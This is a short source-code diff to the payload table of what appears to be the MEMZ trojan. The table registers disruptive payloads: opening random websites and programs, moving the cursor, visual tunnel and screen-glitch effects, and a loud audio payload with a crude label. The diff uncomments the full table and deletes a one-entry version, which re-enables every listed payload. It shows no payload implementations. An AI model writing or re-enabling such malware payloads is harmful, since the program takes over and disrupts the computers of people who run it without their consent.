@@ -1,6 +1,5 @@
 #include "../MEMZ.h"
 
-/**
 PAYLOAD payloads[] = {
 	Payload(L"Open random websites/programs", payloadHostDefault, (LPVOID)payloadExecute, 30000, FALSE), 
 	Payload(L"Random cursor movement", payloadHostDefault, (LPVOID)payloadCursor, 20000, TRUE), 
@@ -13,11 +12,6 @@ PAYLOAD payloads[] = {
 	Payload(L"Tunnel effect", payloadHostVisual, (LPVOID)payloadTunnel, 60000, TRUE), 
 	Payload(L"Screen glitches", payloadHostVisual, (LPVOID)payloadScreenGlitches, 15000, TRUE), 
 	Payload(L"Crazy Bus (Ear Rape)", payloadCrazyBus, NULL, 10000, TRUE), 
-};
-**/
-
-PAYLOAD payloads[] = {
-	Payload(L"Open random websites/programs", payloadHostDefault, (LPVOID)payloadExecute, 30000, FALSE),
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
